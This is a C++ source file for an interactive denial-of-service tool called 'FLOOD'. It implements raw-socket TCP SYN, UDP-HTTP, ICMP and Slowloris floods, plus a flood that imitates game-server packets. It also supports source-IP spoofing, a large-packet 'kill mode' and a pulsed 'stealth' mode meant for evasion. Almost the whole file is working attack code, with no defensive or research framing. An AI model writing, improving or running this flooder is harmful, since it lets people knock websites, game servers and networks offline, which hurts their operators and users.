#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <iostream>
#include <vector>
#include <string>
#include <cstring>
#include <atomic>
#include <thread>
#include <chrono>
#include <mutex>
#include <random>
#include <iomanip>
#include <limits>
#include <fstream>
#include <sstream>
#include <csignal>
#include <memory>
#include <ctime>
#include <termios.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <errno.h>

using namespace std;
using namespace chrono;

// --------------------- Constants ---------------------
const string AUTH_FILE = ".flood_auth.dat";
const unsigned char XOR_KEY = 0xAA;

const vector<string> USER_AGENTS = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0"
};

const vector<vector<unsigned char>> GAME_PATTERNS = {
    {0x1e, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01}, // Fortnite
    {0x09, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00}, // Unreal Engine 5
    {0xFF, 0xFF, 0xFF, 0xFF, 0x54, 0x53, 0x6F, 0x75, 0x72, 0x63, 0x65, 0x20,
     0x45, 0x6E, 0x67, 0x69, 0x6E, 0x65, 0x20, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00} // Valve
};

// --------------------- Globals ---------------------
atomic<bool> g_running(false);
atomic<uint64_t> g_total_packets(0);
mutex g_console_mutex;

// --------------------- Utility ---------------------
void clear_screen() { cout << "\033[2J\033[1;1H"; }

string get_password_input(const string& prompt) {
    cout << prompt;
    struct termios oldt, newt;
    tcgetattr(STDIN_FILENO, &oldt);
    newt = oldt;
    newt.c_lflag &= ~ECHO;
    tcsetattr(STDIN_FILENO, TCSANOW, &newt);
    string pass;
    cin >> pass;
    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
    cout << endl;
    return pass;
}

string xor_encrypt_decrypt(const string& data) {
    string result = data;
    for (size_t i = 0; i < result.size(); ++i) result[i] ^= XOR_KEY;
    return result;
}

bool authenticate_user() {
    ifstream auth_file(AUTH_FILE);
    if (!auth_file.good()) {
        cout << "\033[1;33m[!] First run. Create admin account.\033[0m\n";
        string user, pass, confirm;
        cout << "\033[1;32m[+] Enter username: \033[0m"; cin >> user;
        pass = get_password_input("\033[1;32m[+] Enter password: \033[0m");
        confirm = get_password_input("\033[1;32m[+] Confirm password: \033[0m");
        if (pass != confirm) {
            cout << "\033[1;31m[!] Passwords do not match.\033[0m\n";
            return false;
        }
        ofstream out(AUTH_FILE, ios::binary);
        string line = user + ":" + pass;
        string encrypted = xor_encrypt_decrypt(line);
        out.write(encrypted.c_str(), encrypted.size());
        cout << "\033[1;32m[+] Account created!\033[0m\n";
        cout << "Press ENTER to continue...";
        cin.ignore(numeric_limits<streamsize>::max(), '\n'); cin.get();
        return true;
    }
    string enc;
    getline(auth_file, enc);
    string dec = xor_encrypt_decrypt(enc);
    size_t pos = dec.find(':');
    if (pos == string::npos) {
        cout << "\033[1;31m[!] Auth file corrupted.\033[0m\n";
        return false;
    }
    string stored_user = dec.substr(0, pos);
    string stored_pass = dec.substr(pos + 1);
    
    cout << "\033[1;36m═══════════════════════════════════════\033[0m\n";
    cout << "\033[1;33m LOGIN REQUIRED\033[0m\n";
    cout << "\033[1;36m═══════════════════════════════════════\033[0m\n";
    cout << "\033[1;32mUsername: \033[0m"; string input_user; cin >> input_user;
    string input_pass = get_password_input("\033[1;32mPassword: \033[0m");
    
    if (input_user == stored_user && input_pass == stored_pass) {
        cout << "\033[1;32m[+] Access granted!\033[0m\n\n";
        return true;
    }
    cout << "\033[1;31m[-] Invalid credentials.\033[0m\n";
    return false;
}

void increase_limits() {
    struct rlimit rl;
    rl.rlim_cur = rl.rlim_max = 1000000;
    setrlimit(RLIMIT_NOFILE, &rl);
    rl.rlim_cur = rl.rlim_max = RLIM_INFINITY;
    setrlimit(RLIMIT_MEMLOCK, &rl);
    rl.rlim_cur = rl.rlim_max = 200000;
    setrlimit(RLIMIT_NPROC, &rl);
}

unsigned short checksum(void* b, int len) {
    unsigned short* buf = (unsigned short*)b;
    unsigned int sum = 0;
    for (sum = 0; len > 1; len -= 2) sum += *buf++;
    if (len == 1) sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

string resolve_host(const string& host) {
    struct hostent* he = gethostbyname(host.c_str());
    if (he == nullptr) return host;
    struct in_addr** addr_list = (struct in_addr**)he->h_addr_list;
    if (addr_list[0] != nullptr)
        return inet_ntoa(*addr_list[0]);
    return host;
}

string generate_http_headers(const string& host) {
    int ua_idx = rand() % USER_AGENTS.size();
    stringstream ss;
    ss << "GET / HTTP/1.1\r\n";
    ss << "Host: " << host << "\r\n";
    ss << "User-Agent: " << USER_AGENTS[ua_idx] << "\r\n";
    ss << "Accept: */*\r\n";
    ss << "Accept-Language: en-US,en;q=0.9\r\n";
    ss << "Connection: keep-alive\r\n\r\n";
    return ss.str();
}

bool safe_input_bool(const string& prompt) {
    char ch;
    while (true) {
        cout << prompt;
        cin >> ch;
        ch = tolower(ch);
        if (ch == 'y') return true;
        if (ch == 'n') return false;
        cout << "\033[1;31m[!] Invalid input. Please enter 'y' or 'n'.\033[0m\n";
        cin.clear();
        cin.ignore(numeric_limits<streamsize>::max(), '\n');
    }
}

// --------------------- Attack Config ---------------------
struct AttackConfig {
    string target_ip;
    int target_port;
    int num_threads = 10;
    int duration = 0;
    int pps_per_thread = 1000;
    bool spoof_ip = true;
    bool kill_mode = false;
    bool pulse_mode = false;
    bool game_mode = false;
    bool spoof_subnet = false;
    string spoof_subnet_base;
    int spoof_subnet_mask = 24;
};

// --------------------- IP Generation (Corrected Subnet Logic) ---------------------
unsigned int generate_random_ip(const AttackConfig& cfg) {
    if (!cfg.spoof_ip) return 0;
    if (cfg.spoof_subnet && !cfg.spoof_subnet_base.empty()) {
        unsigned int base_host = ntohl(inet_addr(cfg.spoof_subnet_base.c_str()));
        unsigned int host_mask = (1u << (32 - cfg.spoof_subnet_mask)) - 1;
        unsigned int random_host = rand() % host_mask;
        unsigned int combined_host = base_host | random_host;
        return htonl(combined_host);
    }
    unsigned int ip;
    do {
        ip = rand() % 0xFFFFFFFF;
    } while ((ip & 0xFF) == 10 ||
             ((ip & 0xF0) == 0xAC && ((ip >> 8) & 0xF0) == 0x10) ||
             ((ip & 0xFFFF) == 0xA8C0) ||
             (ip & 0xFF) == 127 ||
             (ip & 0xF0) == 0xE0);
    return ip;
}

// --------------------- Attack Engine Base ---------------------
class AttackEngine {
protected:
    vector<pthread_t> workers;
    atomic<bool> running{false};
    AttackConfig config;
    atomic<uint64_t> packet_counter{0};
    struct sockaddr_in dest_addr;
    int raw_socket = -1;
    int icmp_socket = -1;
    
    static void* thread_entry(void* arg) {
        auto* self = static_cast<AttackEngine*>(arg);
        try {
            self->worker_function(0);
        } catch (...) {}
        return nullptr;
    }
    
public:
    AttackEngine(const AttackConfig& cfg) : config(cfg) {
        memset(&dest_addr, 0, sizeof(dest_addr));
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(config.target_port);
        inet_pton(AF_INET, config.target_ip.c_str(), &dest_addr.sin_addr);
    }
    
    virtual ~AttackEngine() {
        stop();
        if (raw_socket >= 0) close(raw_socket);
        if (icmp_socket >= 0) close(icmp_socket);
    }
    
    virtual void worker_function(int thread_id) = 0;
    
    void start() {
        running = true;
        raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (raw_socket < 0) {
            perror("Raw socket creation failed");
            running = false;
            return;
        }
        int one = 1;
        setsockopt(raw_socket, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        
        icmp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        
        pthread_attr_t attr;
        pthread_attr_init(&attr);
        pthread_attr_setstacksize(&attr, 128 * 1024);
        
        workers.resize(config.num_threads);
        for (int i = 0; i < config.num_threads; ++i) {
            int ret = pthread_create(&workers[i], &attr, &AttackEngine::thread_entry, this);
            if (ret != 0) {
                lock_guard<mutex> lock(g_console_mutex);
                cerr << "\033[1;31m[!] Failed to create thread " << i << ": " << strerror(ret) << "\033[0m\n";
            }
        }
        pthread_attr_destroy(&attr);
    }
    
    void stop() {
        running = false;
        for (auto& t : workers) {
            if (t) pthread_join(t, nullptr);
        }
        workers.clear();
        if (raw_socket >= 0) { close(raw_socket); raw_socket = -1; }
        if (icmp_socket >= 0) { close(icmp_socket); icmp_socket = -1; }
    }
    
    uint64_t get_packet_count() const { return packet_counter.load(); }
    bool is_running() const { return running.load(); }
    const AttackConfig& get_config() const { return config; }
};

// --------------------- TCP SYN Flood ---------------------
class TCPSynFlood : public AttackEngine {
public:
    using AttackEngine::AttackEngine;
    
    void worker_function(int) override {
        char packet[4096];
        struct iphdr* iph = (struct iphdr*)packet;
        struct tcphdr* tcph = (struct tcphdr*)(packet + sizeof(struct iphdr));
        unsigned int seed = time(nullptr) ^ pthread_self();
        
        while (running) {
            memset(packet, 0, 4096);
            
            iph->ihl = 5;
            iph->version = 4;
            iph->tos = 0;
            iph->id = htons(rand_r(&seed) % 65535);
            iph->frag_off = 0;
            iph->ttl = 64 + (rand_r(&seed) % 64);
            iph->protocol = IPPROTO_TCP;
            iph->check = 0;
            iph->saddr = generate_random_ip(config);
            iph->daddr = dest_addr.sin_addr.s_addr;
            
            tcph->source = htons(1024 + (rand_r(&seed) % 64511));
            tcph->dest = htons(config.target_port);
            tcph->seq = htonl(rand_r(&seed));
            tcph->ack_seq = 0;
            tcph->doff = 5;
            tcph->syn = 1;
            tcph->window = htons(65535);
            tcph->check = 0;
            tcph->urg_ptr = 0;
            
            unsigned char* payload = (unsigned char*)(packet + sizeof(struct iphdr) + sizeof(struct tcphdr));
            int payload_len;
            if (config.kill_mode) {
                payload_len = 1400;
                for (int i = 0; i < payload_len; ++i) payload[i] = rand_r(&seed) % 256;
            } else {
                payload_len = 8;
                for (int i = 0; i < payload_len; ++i) payload[i] = rand_r(&seed) % 256;
            }
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len;
            
            struct {
                unsigned int saddr, daddr;
                unsigned char zero;
                unsigned char protocol;
                unsigned short tcp_len;
            } pseudo;
            pseudo.saddr = iph->saddr;
            pseudo.daddr = iph->daddr;
            pseudo.zero = 0;
            pseudo.protocol = IPPROTO_TCP;
            pseudo.tcp_len = htons(sizeof(struct tcphdr) + payload_len);
            
            char pseudogram[sizeof(pseudo) + sizeof(struct tcphdr) + payload_len];
            memcpy(pseudogram, &pseudo, sizeof(pseudo));
            memcpy(pseudogram + sizeof(pseudo), tcph, sizeof(struct tcphdr) + payload_len);
            tcph->check = checksum(pseudogram, sizeof(pseudogram));
            iph->check = checksum(packet, iph->tot_len);
            
            sendto(raw_socket, packet, iph->tot_len, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
            packet_counter++;
            
            if (config.pulse_mode)
                this_thread::sleep_for(milliseconds(25));
            else if (config.pps_per_thread > 0)
                this_thread::sleep_for(microseconds(1000000 / config.pps_per_thread));
        }
    }
};

// --------------------- UDP HTTP Flood ---------------------
class UDPHTTPFlood : public AttackEngine {
public:
    using AttackEngine::AttackEngine;
    
    void worker_function(int) override {
        char packet[4096];
        struct iphdr* iph = (struct iphdr*)packet;
        struct udphdr* udph = (struct udphdr*)(packet + sizeof(struct iphdr));
        unsigned int seed = time(nullptr) ^ pthread_self();
        
        while (running) {
            memset(packet, 0, 4096);
            string http_payload = generate_http_headers(config.target_ip);
            int payload_len = http_payload.size();
            
            iph->ihl = 5;
            iph->version = 4;
            iph->tos = 0;
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len;
            iph->id = htons(rand_r(&seed) % 65535);
            iph->frag_off = 0;
            iph->ttl = 64 + (rand_r(&seed) % 64);
            iph->protocol = IPPROTO_UDP;
            iph->check = 0;
            iph->saddr = generate_random_ip(config);
            iph->daddr = dest_addr.sin_addr.s_addr;
            
            udph->source = htons(1024 + (rand_r(&seed) % 64511));
            udph->dest = htons(config.target_port);
            udph->len = htons(sizeof(struct udphdr) + payload_len);
            udph->check = 0;
            
            memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), http_payload.c_str(), payload_len);
            iph->check = checksum(packet, iph->tot_len);
            
            sendto(raw_socket, packet, iph->tot_len, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
            packet_counter++;
            
            if (config.pulse_mode)
                this_thread::sleep_for(milliseconds(25));
            else if (config.pps_per_thread > 0)
                this_thread::sleep_for(microseconds(1000000 / config.pps_per_thread));
        }
    }
};

// --------------------- Slowloris ---------------------
class SlowlorisEngine : public AttackEngine {
    struct SlowSocket {
        int fd;
        steady_clock::time_point last_send;
    };
    vector<vector<SlowSocket>> thread_sockets;
    mutex socket_mutex;
    
public:
    using AttackEngine::AttackEngine;
    
    void worker_function(int) override {
        int sockets_per_thread = 20;
        vector<SlowSocket> sockets;
        unsigned int seed = time(nullptr) ^ pthread_self();
        
        for (int i = 0; i < sockets_per_thread; ++i) {
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) continue;
            int flags = fcntl(sock, F_GETFL, 0);
            fcntl(sock, F_SETFL, flags | O_NONBLOCK);
            
            struct sockaddr_in addr = dest_addr;
            connect(sock, (struct sockaddr*)&addr, sizeof(addr));
            string headers = "GET / HTTP/1.1\r\nHost: " + config.target_ip + "\r\n";
            headers += "User-Agent: " + USER_AGENTS[rand_r(&seed) % USER_AGENTS.size()] + "\r\n";
            send(sock, headers.c_str(), headers.size(), MSG_NOSIGNAL);
            sockets.push_back({sock, steady_clock::now()});
        }
        {
            lock_guard<mutex> lock(socket_mutex);
            thread_sockets.push_back(sockets);
        }
        
        while (running) {
            for (auto& s : sockets) {
                auto now = steady_clock::now();
                if (duration_cast<seconds>(now - s.last_send).count() > 10 + (rand_r(&seed) % 20)) {
                    string keep = "X-Keep-Alive: " + to_string(rand_r(&seed)) + "\r\n";
                    send(s.fd, keep.c_str(), keep.size(), MSG_NOSIGNAL);
                    s.last_send = now;
                    packet_counter++;
                }
            }
            this_thread::sleep_for(milliseconds(500));
        }
        for (auto& s : sockets) close(s.fd);
    }
};

// --------------------- ICMP Flood ---------------------
class ICMPFlood : public AttackEngine {
public:
    using AttackEngine::AttackEngine;
    
    void start() {
        running = true;
        icmp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (icmp_socket < 0) {
            perror("ICMP socket failed");
            running = false;
            return;
        }
        AttackEngine::start();
    }
    
    void worker_function(int) override {
        char packet[1500];
        struct icmphdr* icmp = (struct icmphdr*)packet;
        unsigned int seed = time(nullptr) ^ pthread_self();
        
        while (running) {
            memset(packet, 0, 1500);
            icmp->type = ICMP_ECHO;
            icmp->code = 0;
            icmp->un.echo.id = htons(rand_r(&seed) % 65535);
            icmp->un.echo.sequence = htons(rand_r(&seed) % 65535);
            int payload_len = config.kill_mode ? 1400 : 56;
            icmp->checksum = checksum(packet, sizeof(*icmp) + payload_len);
            
            sendto(icmp_socket, packet, sizeof(*icmp) + payload_len, 0,
                   (struct sockaddr*)&dest_addr, sizeof(dest_addr));
            packet_counter++;
            
            if (config.pulse_mode)
                this_thread::sleep_for(milliseconds(25));
            else if (config.pps_per_thread > 0)
                this_thread::sleep_for(microseconds(1000000 / config.pps_per_thread));
        }
    }
};

// --------------------- Game UDP Flood ---------------------
class GameUDPFlood : public AttackEngine {
private:
    const vector<int> game_ports = {27015, 27016, 7777, 7778, 5222, 5223, 3074, 3478};
    const vector<int> packet_sizes = {32, 64, 128, 256, 512, 1024};
    
public:
    using AttackEngine::AttackEngine;
    
    void worker_function(int) override {
        char packet[4096];
        struct iphdr* iph = (struct iphdr*)packet;
        struct udphdr* udph = (struct udphdr*)(packet + sizeof(struct iphdr));
        unsigned int seed = time(nullptr) ^ pthread_self();
        
        int src_port = game_ports[rand_r(&seed) % game_ports.size()];
        
        while (running) {
            memset(packet, 0, 4096);
            
            int payload_len = packet_sizes[rand_r(&seed) % packet_sizes.size()];
            unsigned char* payload = (unsigned char*)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));
            
            if (config.game_mode) {
                const auto& pattern = GAME_PATTERNS[rand_r(&seed) % GAME_PATTERNS.size()];
                payload_len = pattern.size();
                memcpy(payload, pattern.data(), payload_len);
            } else {
                for (int i = 0; i < payload_len; ++i) payload[i] = rand_r(&seed) % 256;
            }
            
            iph->ihl = 5;
            iph->version = 4;
            iph->tos = 0;
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len;
            iph->id = htons(rand_r(&seed) % 65535);
            iph->frag_off = 0;
            iph->ttl = 64 + (rand_r(&seed) % 64);
            iph->protocol = IPPROTO_UDP;
            iph->check = 0;
            iph->saddr = generate_random_ip(config);
            iph->daddr = dest_addr.sin_addr.s_addr;
            
            udph->source = htons(src_port);
            udph->dest = htons(config.target_port);
            udph->len = htons(sizeof(struct udphdr) + payload_len);
            udph->check = 0;
            
            iph->check = checksum(packet, iph->tot_len);
            
            sendto(raw_socket, packet, iph->tot_len, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
            packet_counter++;
            
            if (config.pulse_mode)
                this_thread::sleep_for(milliseconds(25));
            else if (config.pps_per_thread > 0) {
                int delay_us = 1000000 / config.pps_per_thread;
                int jitter = (rand_r(&seed) % (delay_us / 5)) - (delay_us / 10);
                this_thread::sleep_for(microseconds(delay_us + jitter));
            }
        }
    }
};

// --------------------- Statistics ---------------------
void stats_thread(AttackEngine* engine) {
    auto start_time = steady_clock::now();
    uint64_t last_count = 0;
    while (engine->is_running()) {
        this_thread::sleep_for(seconds(1));
        auto now = steady_clock::now();
        double elapsed = duration_cast<duration<double>>(now - start_time).count();
        uint64_t current = engine->get_packet_count();
        uint64_t speed = current - last_count;
        last_count = current;
        double pps_mb = (speed * 1500.0) / (1024.0 * 1024.0);
        
        lock_guard<mutex> lock(g_console_mutex);
        cout << "\r\033[1;36m[STATS]\033[0m Time: " << fixed << setprecision(1) << elapsed
             << "s | PPS: " << setprecision(2) << pps_mb << " MB/s | Speed: " << speed 
             << " p/s | Total: " << current << " " << flush;
    }
}

// --------------------- UI ---------------------
void print_banner() {
    clear_screen();
    cout << "\033[1;31m";
    cout << "███████╗ ██╗       ██████╗   ██████╗  ██████╗\n";
    cout << "██╔════╝ ██║      ██╔═══██╗ ██╔═══██╗ ██╔══██╗\n";
    cout << "█████╗   ██║      ██║   ██║ ██║   ██║ ██║  ██║\n";
    cout << "██╔══╝   ██║      ██║   ██║ ██║   ██║ ██║  ██║\n";
    cout << "██║      ███████╗ ╚██████╔╝ ╚██████╔╝ ██████╔╝\n";
    cout << "╚═╝      ╚══════╝  ╚═════╝   ╚═════╝  ╚═════╝\n";
    cout << "\033[0m";
}

void show_help() {
    clear_screen();
    cout << "\033[1;36m══════════════════════════════════════════════════════════════════\033[0m\n";
    cout << "\033[1;33m HELP & INFORMATION\033[0m\n";
    cout << "\033[1;36m══════════════════════════════════════════════════════════════════\033[0m\n\n";
    cout << "\033[1;32m1. TCP SYN Attack:\033[0m\n - Sends SYN packets using raw sockets.\n\n";
    cout << "\033[1;32m2. UDP HTTP Attack:\033[0m\n - Sends HTTP requests wrapped in UDP packets.\n\n";
    cout << "\033[1;32m3. Slowloris Attack:\033[0m\n - Opens many connections and keeps them alive.\n\n";
    cout << "\033[1;32m4. ICMP Attack:\033[0m\n - Ping flood (ICMP Echo requests).\n\n";
    cout << "\033[1;32m5. Game UDP Attack:\033[0m\n - Stealth UDP flood with game patterns.\n\n";
    cout << "\033[1;36m──────────────────────────────────────────────────────────────────\033[0m\n";
    cout << "\033[1;33m ADVANCED OPTIONS\033[0m\n";
    cout << "\033[1;36m──────────────────────────────────────────────────────────────────\033[0m\n\n";
    cout << "\033[1;33mThreads:\033[0m Number of parallel workers.\n";
    cout << "\033[1;33mPPS per thread:\033[0m Packets per second per thread (0 = unlimited).\n";
    cout << "\033[1;33mKill Mode:\033[0m Increases packet size to 1400 bytes (bandwidth flood).\n";
    cout << "\033[1;33mPulse Mode:\033[0m Adds 25ms delay between packets for evasion.\n";
    cout << "\033[1;33mIP Spoofing:\033[0m Randomize source IP address.\n";
    cout << "\033[1;33mSubnet Spoofing:\033[0m Restrict spoofing to a subnet (e.g., 192.168.0.0/24).\n\n";
    cout << "Note: In live stats, 'PPS' shows data rate (MB/s), 'Speed' shows packets/sec.\n";
    cout << "\033[1;36m══════════════════════════════════════════════════════════════════\033[0m\n";
    cout << "\nPress ENTER to return...";
    cin.ignore(numeric_limits<streamsize>::max(), '\n'); cin.get();
}

void run_attack(unique_ptr<AttackEngine> engine) {
    auto start_time = steady_clock::now();
    thread stats([&]() { stats_thread(engine.get()); });
    engine->start();
    
    const AttackConfig& cfg = engine->get_config();
    cout << "\n\033[1;41m ATTACKING " << cfg.target_ip << ":" << cfg.target_port;
    if (cfg.spoof_ip) {
        cout << " [IP Spoofing: ENABLED";
        if (cfg.spoof_subnet) cout << " - Subnet: " << cfg.spoof_subnet_base << "/" << cfg.spoof_subnet_mask;
        cout << "]";
    } else {
        cout << " [IP Spoofing: DISABLED - Using real IP]";
    }
    cout << " ... [Press ENTER to stop] \033[0m\n";

    atomic<bool> stop_flag(false);
    
    thread input_thread([&]() {
        cin.ignore(numeric_limits<streamsize>::max(), '\n');
        cin.get();
        stop_flag = true;
    });
    input_thread.detach();

    bool manual_stop = true;
    if (cfg.duration > 0) {
        auto end_time = start_time + seconds(cfg.duration);
        while (engine->is_running() && steady_clock::now() < end_time && !stop_flag) {
            this_thread::sleep_for(milliseconds(100));
        }
        if (steady_clock::now() >= end_time) manual_stop = false;
    } else {
        while (engine->is_running() && !stop_flag) {
            this_thread::sleep_for(milliseconds(100));
        }
    }

    engine->stop();
    if (stats.joinable()) stats.join();

    auto end_time = steady_clock::now();
    double total_time = duration_cast<duration<double>>(end_time - start_time).count();
    uint64_t packets = engine->get_packet_count();
    double avg_packet_size = 1500.0;
    double total_mb = (packets * avg_packet_size) / (1024.0 * 1024.0);

    cout << "\n\n\033[1;32m╔══════════════════════════════════════════════════════════════════╗\033[0m\n";
    cout << "\033[1;32m║                      ATTACK FINISHED                             ║\033[0m\n";
    cout << "\033[1;32m╠══════════════════════════════════════════════════════════════════╣\033[0m\n";
    cout << "\033[1;32m║\033[0m \033[1;33mTotal Packets\033[0m │\033[1;37m" << setw(12) << packets << "\033[0m \033[1;32m                                     ║\033[0m\n";
    cout << "\033[1;32m║\033[0m \033[1;33mTotal Time\033[0m    │\033[1;37m" << setw(10) << fixed << setprecision(2) << total_time << "seconds\033[0m \033[1;32m                                ║\033[0m\n";
    cout << "\033[1;32m║\033[0m \033[1;33mData Volume\033[0m   │\033[1;37m" << setw(10) << setprecision(2) << total_mb << " MB\033[0m \033[1;32m                                    ║\033[0m\n";
    cout << "\033[1;32m╠══════════════════════════════════════════════════════════════════╣\033[0m\n";
    cout << "\033[1;32m║\033[0m Stop reason: =" << (manual_stop ?"\033[1;33mManually stopped\033[0m": "\033[1;33mDuration completed\033[0m") << " \033[1;32m                                   ║\033[0m\n";
    cout << "\033[1;32m╚══════════════════════════════════════════════════════════════════╝\033[0m\n";
    
    cout << "\n[#] Press ENTER to return to menu...";
    cin.get();
}

// --------------------- Main ---------------------
int main() {
    if (getuid() != 0) {
        cerr << "\033[1;31mThis tool requires root privileges. Run with sudo.\033[0m\n";
        return 1;
    }
    increase_limits();
    srand(time(nullptr) ^ getpid());
    
    if (!authenticate_user()) return 1;
    
    while (true) {
        print_banner();
        cout << "\n";
        cout << "\033[1;36m ╔════════════════════════════════════════╗\033[0m\n";
        cout << "\033[1;36m ║              MAIN MENU                 ║\033[0m\n";
        cout << "\033[1;36m ╠════════════════════════════════════════╣\033[0m\n";
        cout << "\033[1;36m ║\033[0m 1. \033[1;32mTCP SYN Attack\033[0m \033[1;36m                     ║\033[0m\n";
        cout << "\033[1;36m ║\033[0m 2. \033[1;32mUDP HTTP Attack\033[0m \033[1;36m                    ║\033[0m\n";
        cout << "\033[1;36m ║\033[0m 3. \033[1;32mSlowloris Attack\033[0m \033[1;36m                   ║\033[0m\n";
        cout << "\033[1;36m ║\033[0m 4. \033[1;32mICMP Attack\033[0m \033[1;36m                        ║\033[0m\n";
        cout << "\033[1;36m ║\033[0m 5. \033[1;32mGame UDP Attack\033[0m \033[1;36m                    ║\033[0m\n";
        cout << "\033[1;36m ║\033[0m 6. \033[1;36mHelp / Information\033[0m \033[1;36m                 ║\033[0m\n";
        cout << "\033[1;36m ║\033[0m 7. \033[1;31mExit\033[0m \033[1;36m                               ║\033[0m\n";
        cout << "\033[1;36m ╚════════════════════════════════════════╝\033[0m\n";
        cout << " \033[1;33m>\033[0m ";
        
        int opt;
        cin >> opt;
        if (cin.fail()) { cin.clear(); cin.ignore(1000, '\n'); continue; }
        
        if (opt == 7) break;
        if (opt == 6) { show_help(); continue; }
        
        AttackConfig cfg;
        string target_input;
        
        cout << "\033[1;32m[+] Target (URL or IP): \033[0m"; cin >> target_input;
        cfg.target_ip = resolve_host(target_input);
        if (cfg.target_ip != target_input)
            cout << "\033[1;33m[+] Resolved to: " << cfg.target_ip << "\033[0m\n";
        
        cout << "\033[1;32m[+] Port: \033[0m"; cin >> cfg.target_port;
        cout << "\033[1;32m[+] Threads: \033[0m"; cin >> cfg.num_threads;
        if (cfg.num_threads < 1) cfg.num_threads = 1;
        cout << "\033[1;32m[+] Duration (seconds, 0=unlimited): \033[0m"; cin >> cfg.duration;
        cout << "\033[1;32m[+] PPS per thread (0=max): \033[0m"; cin >> cfg.pps_per_thread;
        
        cfg.kill_mode = safe_input_bool("\033[1;32m[+] Kill Mode (large packets)? (y/n): \033[0m");
        cfg.pulse_mode = safe_input_bool("\033[1;32m[+] Pulse Mode (stealth)? (y/n): \033[0m");
        cfg.spoof_ip = safe_input_bool("\033[1;32m[+] IP Spoofing? (y/n): \033[0m");
        
        if (cfg.spoof_ip) {
            cfg.spoof_subnet = safe_input_bool("\033[1;32m[+] Restrict Spoofing to Subnet? (y/n): \033[0m");
            if (cfg.spoof_subnet) {
                cout << "\033[1;32m[+] Subnet (e.g., 192.168.0.0/24): \033[0m";
                string subnet_input;
                cin >> subnet_input;
                size_t slash = subnet_input.find('/');
                if (slash != string::npos) {
                    cfg.spoof_subnet_base = subnet_input.substr(0, slash);
                    cfg.spoof_subnet_mask = stoi(subnet_input.substr(slash + 1));
                } else {
                    cfg.spoof_subnet_base = subnet_input;
                    cout << "\033[1;32m[+] CIDR mask (e.g., 24): \033[0m";
                    cin >> cfg.spoof_subnet_mask;
                }
            }
        }
        
        unique_ptr<AttackEngine> engine;
        switch (opt) {
            case 1: engine = make_unique<TCPSynFlood>(cfg); break;
            case 2: engine = make_unique<UDPHTTPFlood>(cfg); break;
            case 3: engine = make_unique<SlowlorisEngine>(cfg); break;
            case 4: engine = make_unique<ICMPFlood>(cfg); break;
            case 5: cfg.game_mode = true; engine = make_unique<GameUDPFlood>(cfg); break;
            default: continue;
        }
        run_attack(move(engine));
    }
    cout << "\033[1;32mGoodbye.\033[0m\n";
    return 0;
}
